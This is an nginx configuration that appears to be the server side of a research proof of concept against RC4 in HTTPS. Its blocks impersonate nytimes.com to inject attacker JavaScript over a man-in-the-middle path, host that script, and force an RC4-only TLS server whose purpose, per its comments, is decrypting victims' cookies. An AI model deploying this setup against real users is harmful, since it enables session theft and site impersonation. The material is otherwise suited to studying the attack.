# Inject frame to our JavaScript code (website that is MitM'ed to inject code)
server {
	listen 80;
	server_name www.nytimes.com;
	root /usr/share/nginx/rc4https/nyt;
	index index.html index.htm;

	location / {
		try_files $uri $uri/ =404;
	}
}


# Server hosting our JavaScript code
server {
	listen 80;
	server_name .r0b.pw;
	root /usr/share/nginx/rc4https/r0b.pw;
	index index.html index.htm;

	location / {
		try_files $uri $uri/ =404;
	}
}


# HTTPS server (we will decrypt cookie sent to this website)
server {
	listen 443;
	server_name .site.com;

	access_log off;
	error_log /dev/null;

	keepalive_requests 1000000000;
	keepalive_timeout 1d;

	root /usr/share/nginx/rc4https/www;
	index index.php index.html index.htm;

	ssl on;
	ssl_certificate /usr/share/nginx/rc4https/ssl/server.crt;
	ssl_certificate_key /usr/share/nginx/rc4https/ssl/server.key;

	# So we don't have to handle session resumption in our TLS debug code
	ssl_session_tickets off;
	ssl_session_timeout 0s;

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
	ssl_ciphers RC4+RSA;
	ssl_prefer_server_ciphers on;

	location / {
		try_files $uri $uri/ =404;
	}

	location ~ \.php$ {
		fastcgi_split_path_info ^(.+\.php)(/.+)$;
		fastcgi_pass unix:/var/run/php5-fpm.sock;
		fastcgi_index index.php;

		include fastcgi.conf;
		fastcgi_param REQUEST_LENGTH "$request_length";
		fastcgi_param REQUEST_HEADERS "$echo_client_request_headers";
	}
}
